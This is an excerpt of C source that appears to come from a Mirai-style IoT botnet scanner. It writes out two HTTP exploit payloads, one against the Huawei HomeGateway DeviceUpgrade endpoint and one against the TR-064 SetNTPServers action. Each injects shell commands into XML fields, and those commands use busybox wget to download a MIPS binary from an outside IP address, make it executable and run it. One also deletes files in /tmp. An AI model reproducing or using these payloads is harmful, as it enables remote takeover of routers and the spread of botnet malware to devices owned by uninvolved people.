            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == REPSCANNER_SC_EXPLOIT_STAGE2)
                    {
						...
						if (choice == 0)
						{
							util_strcpy(conn->payload_buf, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 104.36.19.100/beastmode -l /tmp/BEASTTT -r /b3astmode.mips; /bin/busybox chmod 777 * /tmp/BEASTTT; /tmp/BEASTTT SelfRep-huawei.mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n");
#ifdef DEBUG
						...
						if (choice == 3)
						{
							util_strcpy(conn->payload_buf, "POST /UD/act?1 HTTP/1.1\r\nUser-Agent: tbox/1.0\r\nSOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\nContent-Length: 640\r\n\r\n<?xml version=\"1.0\"?>SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;<NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://104.36.19.100/beastmode/b3astmode.mips && chmod 777 /tmp/b3astmode.mips && /tmp/b3astmode.mips dir.mips`</NewNTPServer1><NewNTPServer2>`echo tbox`</NewNTPServer2><NewNTPServer3>`echo tbox`</NewNTPServer3><NewNTPServer4>`echo tbox`</NewNTPServer4><NewNTPServer5>`echo tbox`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n");
#ifdef DEBUG							
